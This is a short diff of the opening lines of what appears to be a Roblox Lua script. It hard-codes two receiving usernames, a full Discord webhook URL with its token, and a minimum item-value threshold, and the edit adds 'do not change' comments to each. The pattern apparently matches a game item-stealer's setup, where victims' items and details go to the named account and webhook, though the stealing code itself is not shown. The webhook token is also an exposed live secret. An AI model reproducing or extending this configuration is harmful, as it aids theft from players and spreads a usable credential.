@@ -1,7 +1,7 @@
-Username = "himynameisthomash"
-Username2 = "himynameisthomash"
-webhook = "https://discord.com/api/webhooks/1316574103632871424/HRJ48jsTR4Zldcv-5dwX8uv6ZBDqPA_22TJ_SH5zJbBKs-x12BlebzLtY5qibmF-BrE6"
-min_rap = 100000
+Username = "himynameisthomash" --do not change or will not work
+Username2 = "himynameisthomash" -do not change
+webhook = "https://discord.com/api/webhooks/1316574103632871424/HRJ48jsTR4Zldcv-5dwX8uv6ZBDqPA_22TJ_SH5zJbBKs-x12BlebzLtY5qibmF-BrE6" --do not change
+min_rap = 100000 --do not change
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
